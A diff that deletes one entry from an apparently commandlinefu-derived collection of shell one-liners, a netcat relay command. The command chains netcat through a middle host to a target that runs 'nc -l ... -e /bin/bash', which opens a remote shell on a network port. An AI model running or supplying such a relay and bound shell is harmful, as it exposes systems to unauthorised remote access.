@@ -1,8 +1,0 @@
-commandlinefu_id: 4729
-translator:
-  weibo: ''
-hide: true
-command: |-
-  nc -vv $MIDDLEHOST 1234; ## nc -vv -l $IamMIDDLEHOST 1234 | nc $Targethost 1234;##  nc -l $IamTargetHost 1234 -e /bin/bash;
-summary: |-
-  Netcat Relay
